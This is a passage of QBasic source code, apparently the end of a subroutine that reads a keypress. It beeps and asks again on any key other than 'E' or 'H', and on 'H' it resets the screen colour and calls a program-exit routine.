IF UCASE$(k$) <> "E" THEN
 IF UCASE$(k$) <> "H" THEN
   SOUND 3500, .2
   GOTO TekrarTus
 ELSE
  COLOR 7, 0
  CALL ProgramSonu
 END IF
END IF


END SUB

